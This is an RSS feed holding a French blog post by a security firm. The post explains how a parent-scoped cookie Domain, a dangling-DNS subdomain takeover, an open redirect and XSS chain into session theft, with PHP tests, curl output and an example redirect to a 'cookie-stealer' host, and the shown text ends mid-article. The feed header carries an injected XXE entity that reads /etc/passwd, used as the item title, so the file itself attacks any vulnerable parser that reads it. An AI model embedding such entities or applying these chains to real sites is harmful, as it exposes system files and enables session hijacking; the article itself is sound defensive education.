<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>ACCEIS</title>
	<atom:link href="https://www.acceis.fr/feed/" rel="self" type="application/rss+xml" />
	<link>https://www.acceis.fr/</link>
	<description></description>
	<lastBuildDate>Tue, 04 Oct 2022 08:08:22 +0000</lastBuildDate>
	<language>fr-FR</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.0.2</generator>
	<item>
		<title>&xxe;</title>
		<link>https://www.acceis.fr/transformer-des-vulnerabilites-p3-p4-p5-en-p1/</link>
		
		<dc:creator><![CDATA[Alexandre Zanni]]></dc:creator>
		<pubDate>Tue, 04 Oct 2022 07:43:43 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[attaque]]></category>
		<category><![CDATA[cookie]]></category>
		<category><![CDATA[méthodologie]]></category>
		<category><![CDATA[open-redirect]]></category>
		<category><![CDATA[scénario]]></category>
		<category><![CDATA[sous-domaine]]></category>
		<category><![CDATA[XSS]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=2535</guid>

					<description><![CDATA[<p>Transformer des vulnérabilités en ou comment voler des sessions utilisateur en enchaînant plusieurs vulnérabilités à bas risque Note : Cet article est aussi disponible en anglais &#x1f1ec;&#x1f1e7;. Cet article présente un scénario d&#8217;attaque permettant d’enchaîner des vulnérabilités, qui individuellement ont un impact limité, mais qui une fois combinées deviennent redoutablement dangereuses. Ci-dessous se trouvent les [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/transformer-des-vulnerabilites-p3-p4-p5-en-p1/">Transformer des vulnérabilités P3 P4 P5 en P1</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[<p>Transformer des vulnérabilités <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P3.png" alt="P3" /> <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P4.png" alt="P4" /> <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="P5" /> en <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P1.png" alt="P1" /> ou comment voler des sessions utilisateur en enchaînant plusieurs vulnérabilités à bas risque</p>
<p>Note : Cet article est aussi disponible <a href="https://www.acceis.fr/transform-p3-p4-p5-vulnerabilities-to-p1/" title="article: english version">en anglais</a> &#x1f1ec;&#x1f1e7;.</p>
<hr />
<p>Cet article présente un scénario d&#8217;attaque permettant d’enchaîner des vulnérabilités, qui individuellement ont un impact limité, mais qui une fois combinées deviennent redoutablement dangereuses.</p>
<p>Ci-dessous se trouvent les vulnérabilités utilisées (entre parenthèse la catégorie <a href="https://bugcrowd.com/vulnerability-rating-taxonomy"><em>Vulnerability Rating Taxonomy</em> (VRT)</a> et la sévérité) :</p>
<ul>
<li>Un <strong>défaut de configuration</strong> de l&#8217;attribut <em>domain</em> des cookies (<em>Server Security Misconfiguration</em> &#x27a1;&#xfe0f; <em>Cookie scoped to parent domain</em>, <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="P5" />)</li>
<li>Une <strong>prise de contrôle de sous-domaine</strong> (<em>Server Security Misconfiguration</em> &#x27a1;&#xfe0f; <em>Misconfigured DNS</em> &#x27a1;&#xfe0f; <em>Basic Subdomain Takeover</em>, <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P3.png" alt="P3" />)</li>
<li>Une <strong>redirection arbitraire d&#8217;URL</strong> (<em>Unvalidated Redirects and Forwards</em> &#x27a1;&#xfe0f; <em>Open Redirect</em> &#x27a1;&#xfe0f; <em>GET-Based</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P4.png" alt="P4" />), <em>POST-Based</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="P5" />) or <em>Header-Based</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="P5" />))</li>
<li>Une <strong>XSS stockée</strong> (<em>Cross-Site Scripting (XSS)</em> &#x27a1;&#xfe0f; <em>Stored</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P2.png" alt="P2" /> à <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P4.png" alt="P4" /> selon les privilèges requis)) pour l&#8217;aspect <em>zero click</em> ou une <strong>XSS réfléchie</strong> (<em>Cross-Site Scripting (XSS)</em> &#x27a1;&#xfe0f; <em>Reflected</em> &#x27a1;&#xfe0f; <em>Non-Self</em>, <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P3.png" alt="P3" />) si l’interaction utilisateur est acceptable</li>
</ul>
<p><strong>Note</strong> : dans cet article, je vais utiliser la notation <strong>UA</strong> comme diminutif de <em>User-Agent</em> qui désigne n&#8217;importe quel client HTTP (navigateur web, bot, crawler, etc.).</p>
<h2>Défaut de configuration</h2>
<p>Les cookies &#x1f36a; ont un attribut <code>Domain</code> définissant la portée de ceux-ci, c&#8217;est-à-dire sur quelles URLs les cookies doivent être envoyés.</p>
<p>Les pages <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Set-Cookie#domaindomain-value">Set-Cookie</a> et <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Cookies#port%C3%A9e_des_cookies">HTTP cookies</a> du MDN résument bien le comportement de cet attribut pour l&#8217;en-tête <code>Set-Cookie</code> tel que spécifié dans la <a href="https://datatracker.ietf.org/doc/html/rfc6265">RFC 6265</a>.</p>
<p>Accrochez-vous bien, ce n&#8217;est pas aussi simple qu&#8217;il n&#8217;y parait.</p>
<p>D&#8217;un point de vue haut niveau, si l&#8217;attribut <code>Domain</code> est omis du cookie dans l&#8217;en-tête <code>Set-Cookie</code>, alors l&#8217;UA devra n&#8217;utiliser ce cookie que pour l&#8217;hôte de l&#8217;URL du document courant. Donc les sous-domaines ne seront pas inclus. Par exemple, si l&#8217;URL est <a href="http://example.org/blog">http://example.org/blog</a>, le cookie sera valide pour <code>example.org</code> mais pas pour <code>www.example.org</code> ou <code>payment.dev.example.org</code> ou n&#8217;importe quels autres sous-domaines ou domaines.</p>
<pre><code class="language-plaintext">Set-Cookie: noraj=yet%20another%20secret</code></pre>
<p>Si l&#8217;attribut <code>Domain</code> est présent pour le cookie dans l&#8217;en-tête <code>Set-Cookie</code>, alors tous les sous-domaines du domaine spécifié seront acceptés. Par exemple, si <code>Domain=noraj.test</code> alors le cookie sera envoyé pour <code>noraj.test</code> mais aussi <code>www.noraj.test</code>, <code>sub.noraj.test</code>, <code>payment.dev.noraj.test</code>, mais pas pour les autres domaines.</p>
<pre><code class="language-plaintext">Set-Cookie: noraj=yet%20another%20secret; Domain=noraj.test</code></pre>
<p>Mais si l&#8217;on veut rentrer dans les détails, que se passe-t-il réellement côté UA ?</p>
<p>En effet, si spécifier l&#8217;attribut <code>Domain</code> est optionnel dans l&#8217;en-tête <code>Set-Cookie</code>, un cookie stocké dans l&#8217;UA doit obligatoirement avoir un attribut <code>Domain</code> pour être valide et utilisable. La RFC nous met en garde, si l&#8217;attribut <code>Domain</code> n&#8217;est pas présent pour un cookie provenant du <em>Cookie Store</em> alors le comportement sera non défini, mais il est fortement conseillé à l&#8217;UA de l&#8217;ignorer complètement.</p>
<blockquote>
<p>If the attribute-value is empty, the behavior is undefined. However, the user agent SHOULD ignore the cookie-av entirely.</p>
</blockquote>
<p>On devine bien que l&#8217;UA stockera toujours un cookie avec un attribut <code>Domain</code>, que l&#8217;en-tête <code>Set-cookie</code> en ait spécifié un ou non. C&#8217;est ce que nous avons vu auparavant, soit il est spécifié directement soit il ne l&#8217;ait pas et alors il est extrait de l&#8217;URL.</p>
<p>Cependant avec les connaissances apportées actuellement, il semble y avoir un problème. Si aucun domaine n&#8217;est spécifié dans l&#8217;en-tête <code>Set-Cookie</code>, le domaine sera extrait de l&#8217;URL et utilisé dans le cookie stocké par l&#8217;UA (ex : <code>example.org</code>), et les sous-domaines ne seront pas autorisés. Par contre, si un domaine (ex : <code>example.org</code>) est spécifié dans l&#8217;en-tête <code>Set-Cookie</code>, le domaine utilisé dans le cookie stocké par l&#8217;UA sera le même (<code>example.org</code>) mais, cette fois, les sous-domaines seront autorisés. Comment l&#8217;UA peut-il faire la distinction entre deux comportements différents si l&#8217;information stockée est la même ?</p>
<p>On peut trouver la réponse en lisant la RFC.</p>
<blockquote>
<ul>
<li>
<p>If the domain-attribute is non-empty:</p>
<ul>
<li>
<p>If the canonicalized request-host does not domain-match the domain-attribute:</p>
</li>
<li>
<p>Ignore the cookie entirely and abort these steps.</p>
</li>
<li>
<p>Otherwise:</p>
</li>
<li>
<p>Set the cookie&#8217;s host-only-flag to false.</p>
</li>
<li>
<p>Set the cookie&#8217;s domain to the domain-attribute.</p>
</li>
</ul>
</li>
<li>Otherwise:
<ul>
<li>Set the cookie&#8217;s host-only-flag to true.</li>
<li>Set the cookie&#8217;s domain to the canonicalized request-host.</li>
</ul>
</li>
</ul>
</blockquote>
<p>La réponse se trouve dans l&#8217;utilisation d&#8217;un autre attribut de cookie : <a href="https://developer.mozilla.org/fr/docs/Mozilla/Add-ons/WebExtensions/API/cookies/Cookie#hostonly">hostOnly</a>, qui jouera exactement le rôle décrit précédemment.</p>
<p>Faisons un test naïf en PHP.</p>
<p>Tout d&#8217;abord, déclarons un cookie de session et un cookie personnalisé sans spécifier d&#8217;attribut <code>Domain</code>.</p>
<pre><code class="language-php">&lt;?php
  echo &#039;&lt;h1&gt;noraj - OK&lt;/h1&gt;&#039;;
  session_start(); // PHPSESSID
  setcookie(&#039;noraj&#039;, &#039;yet another secret&#039;);
?&gt;</code></pre>
<p>Note : aucun domaine n&#8217;est spécifié, ni directement en paramètre de la fonction, ni via la configuration <code>php.ini</code>, ni via une directive <code>ini_set</code>, ni via une option de la ligne de commande ni d&#8217;une quelque autre façon que ce soit.</p>
<p>On peut vérifier avec curl qu&#8217;aucun attribut <code>Domain</code> n&#8217;est positionné dans les en-têtes <code>Set-Cookie</code> :</p>
<pre><code class="language-plaintext">$ curl http://noraj.test:8080/ -v
*   Trying 127.0.0.2:8080...
* Connected to noraj.test (127.0.0.2) port 8080 (#0)
> GET / HTTP/1.1
> Host: noraj.test:8080
> User-Agent: curl/7.83.1
> Accept: */*
> 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Host: noraj.test:8080
&lt; Date: Tue, 28 Jun 2022 12:31:32 GMT
&lt; Connection: close
&lt; X-Powered-By: PHP/8.1.7
&lt; Set-Cookie: PHPSESSID=n7ktvgv47t55ndlfrc1v5uaoin; path=/
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Set-Cookie: noraj=yet%20another%20secret
&lt; Content-type: text/html; charset=UTF-8
&lt; 
* Closing connection 0
&lt;h1&gt;noraj - OK&lt;/h1&gt;</code></pre>
<p>Dans l&#8217;onglet <code>Storage</code>, de la console développeur de Firefox (version 101.0.1), on retrouve les cookies.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_no_domain.png" alt="" /></p>
<p>Ces cookies ont bien l&#8217;attribut <code>Domain</code> égal à l&#8217;hôte de l&#8217;URL requêté, car aucun attribut <code>Domain</code> n&#8217;était présent dans l&#8217;en-tête <code>Set-Cookie</code>. Par défaut, d&#8217;autres attributs sont affichés comme <code>Path</code>, <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, etc. L&#8217;attribut <code>HostOnly</code> est l&#8217;un des seuls non affichés par défaut. Cependant, il est possible d&#8217;ajouter la colonne correspondant à cet attribut.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_no_domain2.png" alt="" /></p>
<p>On voit bien qu&#8217;avec l&#8217;attribut <code>HostOnly</code> à <code>true</code>, les cookies ne seront pas envoyés aux sous-domaines.</p>
<p>Note : Chromium (version 103.0.5060.53) ne permet pas de visualiser l&#8217;attribut <code>HostOnly</code>. Pour y accéder, il faudrait créer une extension qui utilise l&#8217;API <a href="https://developer.chrome.com/docs/extensions/reference/cookies/">chrome.cookies</a> (cette API n&#8217;est pas disponible depuis la console JavaScript), ce qui n&#8217;est absolument pas pratique, d&#8217;où l&#8217;utilisation de Firefox.</p>
<p>Un autre serveur web va servir les sous-domaines <code>sub.noraj.test</code> et <code>www.noraj.test</code>, en les contactant avec le même navigateur, les cookies ne seront pas envoyés, ces sites n&#8217;y auront donc pas accès.</p>
<p>Si l&#8217;on modifie légèrement le code afin que le serveur spécifié un attribut <code>Domain</code> pour l&#8217;en-tête <code>Set-Cookie</code>, nous pourrons observer l&#8217;autre cas.</p>
<pre><code class="language-php">&lt;?php
  echo &#039;&lt;h1&gt;noraj - OK&lt;/h1&gt;&#039;;
  session_start([&#039;cookie_domain&#039; =&gt; &#039;noraj.test&#039;]); // PHPSESSID
  setcookie(&#039;noraj&#039;, &#039;yet another secret&#039;, [&#039;domain&#039; =&gt; &#039;noraj.test&#039;]);
?&gt;</code></pre>
<p>Une vérification avec curl nous permet de voir l&#8217;attribut positionné dans la réponse du serveur.</p>
<pre><code class="language-plaintext">$ curl http://noraj.test:8080/ -v
*   Trying 127.0.0.2:8080...
* Connected to noraj.test (127.0.0.2) port 8080 (#0)
> GET / HTTP/1.1
> Host: noraj.test:8080
> User-Agent: curl/7.83.1
> Accept: */*
> 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Host: noraj.test:8080
&lt; Date: Tue, 28 Jun 2022 13:00:16 GMT
&lt; Connection: close
&lt; X-Powered-By: PHP/8.1.7
&lt; Set-Cookie: PHPSESSID=q5kkcsmgpebi6g57p8kd6clh83; path=/; domain=noraj.test
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Set-Cookie: noraj=yet%20another%20secret; domain=noraj.test
&lt; Content-type: text/html; charset=UTF-8
&lt; 
* Closing connection 0
&lt;h1&gt;noraj - OK&lt;/h1</code></pre>
<p>Note : pour l&#8217;expérimentation dans le navigateur web, bien veiller à faire une requête qui contourne le cache (<kdb>CTRL</kdb> + <kdb>F5</kdb>) ainsi qu&#8217;à purger les cookies stockés entre chaque requête.</p>
<p>Maintenant, dans Firefox, on observe des différences, cette fois-ci l&#8217;attribut <code>HostOnly</code> est bien positionné à <code>false</code>, les cookies devraient être envoyés aux sous-domaines.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain.png" alt="" /></p>
<p>On note aussi que l&#8217;attribut <code>Domain</code> vaut maintenant <code>.noraj.test</code> et plus <code>noraj.test</code>.</p>
<p>Lorsque ce point préfixé est présent dans l&#8217;en-tête <code>Set-Cookie</code>, c&#8217;est un reliquat du passé qui n&#8217;a aucune importance, cela date d&#8217;un comportement d&#8217;une ancienne version de la RFC et certaines applications choisissent de le fournir en violant la RFC. On trouve une note à ce sujet dans la RFC 6265 pour l&#8217;en-tête <code>Set-Cookie</code>.</p>
<blockquote>
<p>Note that a leading %x2E (&quot;.&quot;), if present,<br />
is ignored even though that character is not permitted,</p>
</blockquote>
<p>Par contre, lorsque ce point préfixé est présent, l&#8217;UA a pour rôle de la supprimer.</p>
<blockquote>
<p>If the first character of the attribute-value string is %x2E (&quot;.&quot;):</p>
<ul>
<li>Let cookie-domain be the attribute-value without the leading %x2E (&quot;.&quot;) character.</li>
</ul>
<p>Otherwise:</p>
<ul>
<li>Let cookie-domain be the entire attribute-value.</li>
</ul>
</blockquote>
<p>Je suis donc personnellement surpris que Firefox et Chromium aient ce point de positionné dans le <em>Cookie Store</em>. Cela semble véritablement être dû au comportement déprécié de la RFC 2965 qui est obsolète.</p>
<blockquote>
<p><code>Domain=value</code></p>
<p>OPTIONAL. The value of the Domain attribute specifies the domain<br />
for which the cookie is valid.  If an explicitly specified value<br />
does not start with a dot, the user agent supplies a leading dot.</p>
</blockquote>
<p>Refermons cette parenthèse sur le <em>leading dot</em> qui met en lumière l&#8217;écart d&#8217;implémentation de la RFC par ces navigateurs web en tête du marché.</p>
<p>Avec ces cookies ayant l&#8217;attribut <code>HostOnly = false</code>, que l&#8217;on peut qualifier de <em>Cross-domain</em>, si l&#8217;on se rend maintenant sur un sous-domaine comme <code>sub.noraj.test</code>, les cookies lui ont été transmis.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain_on_sub.png" alt="" /></p>
<p>Maintenant, revenons au cas initial où nous ne fournissons pas d&#8217;attribut <code>Domain</code> en argument des fonctions <code>session_start()</code> et <code>setcookie()</code>. Cependant, cette fois-ci, nous spécifierons un domaine avec l&#8217;option de configuration <a href="https://www.php.net/manual/en/session.configuration.php#ini.session.cookie-domain">session.cookie_domain</a> de la configuration de PHP.</p>
<p>Note : Cette option sera plus généralement spécifiée via le fichier de configuration <code>php.ini</code> en production, mais ici pour le besoin de la preuve de concept (<em>PoC</em>), je l&#8217;ai spécifié directement dans le code à l&#8217;aide de la fonction <code>ini_set()</code>.</p>
<pre><code class="language-php">&lt;?php
  ini_set(&#039;session.cookie_domain&#039;, &#039;noraj.test&#039; ); // or in php.ini
  echo &#039;&lt;h1&gt;noraj - OK&lt;/h1&gt;&#039;;
  session_start(); // PHPSESSID
  setcookie(&#039;noraj&#039;, &#039;yet another secret&#039;);
?&gt;</code></pre>
<p>C&#8217;est le moment de deviner quel sera le comportement observé avant que je vous le divulgâche.</p>
<p>Avec curl :</p>
<pre><code class="language-plaintext">$ curl http://noraj.test:8080/ -v
*   Trying 127.0.0.2:8080...
* Connected to noraj.test (127.0.0.2) port 8080 (#0)
> GET / HTTP/1.1
> Host: noraj.test:8080
> User-Agent: curl/7.83.1
> Accept: */*
> 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Host: noraj.test:8080
&lt; Date: Tue, 28 Jun 2022 13:50:58 GMT
&lt; Connection: close
&lt; X-Powered-By: PHP/8.1.7
&lt; Set-Cookie: PHPSESSID=bpp2khdkaii84b3edoibit28dr; path=/; domain=noraj.test
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Set-Cookie: noraj=yet%20another%20secret
&lt; Content-type: text/html; charset=UTF-8
&lt; 
* Closing connection 0
&lt;h1&gt;noraj - OK&lt;/h1&gt;</code></pre>
<p>Avec Firefox sur le domaine principal :</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain2.png" alt="" /></p>
<p>Avec Firefox sur un sous-domaine :</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain_on_sub2.png" alt="" /></p>
<p><code>session.cookie_domain</code> a pour effet de définir un domaine par défaut afin de spécifier dans le cookie de session. Cela ne s&#8217;applique qu&#8217;au cookie de session géré par PHP, <code>PHPSESSID</code>, un domaine sera donc défini même si l&#8217;on ne spécifie aucun argument à la fonction <code>session_start()</code>.</p>
<p>Le piège est là, et il a plusieurs effets pernicieux.</p>
<p>En effet, nous avons pu voir que l&#8217;utilisation de l&#8217;attribut <code>Domain</code> est dangereux, car il permet au navigateur d&#8217;envoyer les cookies à tous les sous-domaines. Mais là où les différentes fonctions de gestion des cookies permettent de spécifier le domaine explicitement, volontairement, au cas par cas; l&#8217;utilisation de <code>session.cookie_domain</code> rend ce comportement implicite, par défaut et potentiellement involontaire. Le comportement de l&#8217;attribut <code>Domain</code> est peu connu du public, la documentation à ce sujet reste assez surfacique et approximative voir même erronée, et c&#8217;est un sujet faux ami : il a l&#8217;air simple en apparence, mais se révèle avoir une complexité assez subtile. Le meilleur moyen de l&#8217;appréhender est donc de lire la RFC 6265. La compréhension du mécanisme est rendue d&#8217;autant plus difficile que la documentation officielle de PHP reste très succincte et mêle aisément ce qui relève du fonctionnement de HTTP de ce qui relève de PHP. On retrouve aussi des billets StackOverflow où la réponse acceptée suggère d&#8217;utiliser <code>session.cookie_domain</code> afin d&#8217;augmenter la sécurité, l&#8217;auteur de cette réponse pense que par défaut si aucune valeur n&#8217;est spécifiée le cookie accepterait tous les domaines et que spécifier un domaine permettrait donc de réduire cela. Bien sûr cette réponse est fausse et est même l&#8217;exact opposé de la réalité. Il n&#8217;est donc pas facile pour un développeur volontaire de se renseigner correctement sur le sujet sans lire la RFC.</p>
<p>Un autre effet insidieux de l&#8217;utilisation de <code>session.cookie_domain</code> dans <code>php.ini</code> est qu&#8217;il est difficile de se rendre compte de celle-ci.<br />
Sur système d&#8217;exploitation comme ArchLinux, il n&#8217;y a qu&#8217;une version de PHP disponible dans les dépôts officiels (enfin il y 2 : PHP 8.1 et PHP 7.4, mais la 7.4 est installé comme <code>php7</code> donc il n&#8217;y a pas d’ambiguïté) et un seul fichier de configuration (<code>/etc/php/php.ini</code>) mais pour une distribution comme Ubuntu, il est possible d&#8217;avoir un grand nombre de versions de PHP installé en parallèle (par exemple <code>/etc/php/{5.6, 7.0, 7.1, 7.2, 7.3, 7.4, 8.0, 8.1}/</code>) et ensuite d&#8217;avoir un fichier de configuration <code>php.ini</code> dédié par application ou par usage (par exemple <code class="kb-btn">/etc/php/8.1/{apache2,cli,fpm}</code>). Il peut donc parfois être difficile d&#8217;identifier le bon fichier de configuration utilisé par l&#8217;application. D&#8217;autant plus que ce changement de configuration dans <code>php.ini</code> ne sera pas visible lors d&#8217;un audit de code ou par un <em>linter</em> lors du développement comme ce fichier ne fait pas partie du projet. Il est toutefois possible de s&#8217;en rendre compte lors d&#8217;un audit de configuration, d&#8217;un test d&#8217;intrusion ou en observant la configuration effective avec <code>phpinfo()</code>.</p>
<p>Pour résumé, l&#8217;utilisation de l&#8217;option de configuration <code>session.cookie_domain</code> en PHP ou tout autre équivalent visant à définir un domaine pour les cookies et donc à autoriser l&#8217;envoi de cookies de session à tous les sous-domaines est dangereux. Si un attaquant prend le contrôle d&#8217;un sous-domaine, il peut alors voler et usurper les sessions des utilisateurs de l&#8217;application du domaine racine ou des autres sous-domaines.</p>
<h2>Prise de contrôle de sous-domaine</h2>
<p>Nous avons précédemment vu le danger de l&#8217;attribut <code>domain</code> des cookies, mais comment faire pour prendre le contrôle d&#8217;un sous-domaine afin de les voler ?</p>
<p>Imaginons une entreprise ayant comme domaine principal <code>axays.fr</code> et ayant les services suivants :</p>
<ul>
<li>blog : <code>blog.axays.fr</code></li>
<li>outil de gestion des tickets : <code>support.axays.fr</code></li>
<li>wiki : <code>wiki.axays.fr</code></li>
<li>calendrier : <code>cal.axays.fr</code></li>
</ul>
<p>Mais voilà qu&#8217;un jour l&#8217;entreprise décide de migrer d&#8217;outil de gestion des tickets. Elle veut passer de l&#8217;outil MegaSoft à l&#8217;outil GigaSoft, mais pour opérer une transition tout en douceur et se laisser le temps de corriger les bugs, l&#8217;entreprise va garder les deux outils en parallèle durant une phase transitoire avant de supprimer MegaSoft. Elle se retrouve donc dans le cas suivant :</p>
<ul>
<li>MegaSoft : <code>support.axays.fr</code></li>
<li>GigaSoft : <code>aide.axays.fr</code></li>
</ul>
<p>La migration se passe sans accro, GigaSoft fonctionne parfaitement, l&#8217;entreprise décide donc de supprimer MegaSoft : elle supprime donc la machine virtuelle infonuagique (<em>cloud</em>) correspondante. Cependant l&#8217;entreprise a oublié de supprimer l&#8217;entrée DNS <code>support.axays.fr</code>. Et alors ? C&#8217;est grave docteur ? Et bien oui !</p>
<p>En effet, l&#8217;entrée DNS du sous-domaine de l&#8217;entreprise est un alias pointant vers un sous-domaine de l&#8217;hébergeur qui pointe vers la ressource infonuagique (<em>cloud</em>) :</p>
<pre><code class="language-plaintext">support.axays.fr CNAME axays-support.monsuperhebergeur.fr.</code></pre>
<p>Or un certain nombre de fournisseurs d&#8217;hébergement ou de services en ligne laissent libre choix aux utilisateurs de réserver n&#8217;importe quelle ressource du moment qu&#8217;elle est disponible. En supprimant la machine virtuelle ou l&#8217;espace d&#8217;hébergement, l&#8217;entreprise a donc libéré l&#8217;espace de nom (<em>namespace</em>) <code>axays-support.monsuperhebergeur.fr</code> et maintenant tout le monde est libre de le réserver.</p>
<p>Un attaquant peut alors réserver l&#8217;espace d&#8217;hébergement <code>axays-support</code> chez le même fournisseur afin d&#8217;obtenir l&#8217;espace de nom <code>axays-support.monsuperhebergeur.fr</code> et y héberger son application malveillante. L&#8217;entrée DNS <code>support.axays.fr</code> étant toujours configurée pour pointer dessus, les victimes se rendant sur <a href="http://support.axays.fr">http://support.axays.fr</a> vont donc envoyer leurs cookies de session à une application gérée par un acteur malveillant, car <code>support.axays.fr</code> est bien un sous-domaine d&#8217;<code>axays.fr</code> et le cookie était configuré avec <code>Domain=axays.fr</code> (donc <code>HostOnly=false</code>).</p>
<p>En résumé, si un sous-domaine de l&#8217;entreprise n&#8217;est plus utilisé, mais continue de pointer vers une ressource infonuagique (<em>cloud</em>) tierce, il y a un risque de prise de contrôle de sous-domaine (<em>subdomain takeover</em>).</p>
<p>Il existe d&#8217;ailleurs le projet <a href="https://github.com/edoverflow/can-i-take-over-xyz">Can I take over XYZ?</a> qui liste les services infonuagiques (<em>cloud</em>) dont on peut réclamer les sous-domaines.</p>
<blockquote>
<p>A list of services and how to claim (sub)domains with dangling DNS records.</p>
</blockquote>
<p>Tous ne sont pas vulnérables et certains le sont sous conditions. Dans le lot, on note en particulier la présence de services très largement utilisés : WordPress, AWS S3 Bucket, Microsoft Azure.</p>
<h2>Forcer l&#8217;utilisateur à tomber dans le piège</h2>
<p>En combinant les deux premières vulnérabilités, on voit bien comment un attaquant peut voler les sessions des utilisateurs, mais il ne va certainement pas attendre que les utilisateurs tombent sur l&#8217;URL malveillante par hasard.</p>
<p>Comment forcer un utilisateur à se rendre sur <a href="http://sous-domaine-compromis.client.com">http://sous-domaine-compromis.client.com</a> ?</p>
<p>Pour cela plusieurs choix possibles :</p>
<ul>
<li>Une <strong>redirection arbitraire d&#8217;URL</strong> (<em>Open Redirect</em>)</li>
<li>Une <strong>XSS stockée</strong> ou une <strong>XSS réfléchie</strong></li>
</ul>
<p>Pour faire court, une redirection arbitraire d&#8217;URL est une page de l&#8217;application web qui va rediriger l&#8217;utilisateur vers une autre page passée en paramètre. Si je reprends mon exemple d&#8217;entreprise fictive, cela donnerait une page vulnérable du blog qui aurait un paramètre <code>url</code> permettant de rediriger l&#8217;utilisateur vers le sous-domaine compromis <code>support.axays.fr</code>.</p>
<pre><code class="language-plaintext">http://blog.axays.fr/page-vulnerable?url=http://support.axays.fr</code></pre>
<p>Il arrive parfois que ce genre de paramètres intègrent un mécanisme de protection où l&#8217;on ne peut passer en paramètre qu&#8217;un chemin relatif au site lui-même, par exemple :</p>
<pre><code class="language-plaintext">http://app.axays.fr/login?redirectUrl=/home</code></pre>
<p>Dans ce cas-là, il sera difficile d&#8217;exploiter la redirection. Cependant, on rencontre aussi des applications acceptant des URLs complètes et qui vérifient si le domaine de l&#8217;URL appartient à l&#8217;entreprise ou non. Si cette vérification n&#8217;est pas faite correctement, c&#8217;est-à-dire en utilisant un <em>parser</em> d&#8217;URL standard et en comparant le champ <em>host</em> extrait à une liste blanche de domaines autorisés, alors le contournement de la sécurité sera possible. En effet, j&#8217;ai déjà eu l&#8217;occasion lors de test d&#8217;intrusion de constater que l&#8217;application se contente de récupérer la <em>string</em> <code>url</code> voir d&#8217;utiliser un <em>parser</em> d&#8217;URL et d&#8217;extraire le champ host, mais de mal effectué la comparaison en regardant uniquement si la <em>string</em> ou le champ <em>host</em> extrait fini par <code>axays.fr</code> au lieu vérifier que cela correspond exactement. On peut aisément comprend pourquoi. Une entreprise qui aurait 500 sous-domaines dont certains sont supprimés ou créés tous les jours n&#8217;a pas envie, de prime abord, de maintenir une liste des sous-domaines à jour. Elle va donc avoir tendance à autoriser <code>.*axays.fr</code> afin d&#8217;accepter tous les sous-domaines. En temps normal ce compromis est acceptable, car un attaquant ne pourra pas envoyer des URL vers un site web tiers, par exemple :</p>
<pre><code class="language-plaintext">http://blog.axays.fr/page-vulnerable?url=http://cookie-stealer.evil.corp</code></pre>
<p>Mais comme ici l&#8217;attaquant contrôle le sous-domaine <code>support.axays.fr</code>, il peut alors aisément contourner ce mécanisme de protection.</p>
<p>Finalement le cyber-criminel pourra commencer à utiliser des techniques d’ingénierie sociale (<em>social engineering</em>) afin de diffuser l&#8217;URL malveillante <code>http://blog.axays.fr/page-vulnerable?url=http://support.axays.fr</code> : campagne d’hameçonnage (<em>phishing</em>), poster l&#8217;URL sur des chats ou sur des forums, etc.</p>
<p>Les plus perspicaces d&#8217;entre vous se diront : </p>
<blockquote>
<p>&quot;A quoi bon utiliser une redirection d&#8217;URL et ne pas fournir l&#8217;URL vers le sous-domaine compromis directement puisque celui-ci parait légitime ?&quot;</p>
</blockquote>
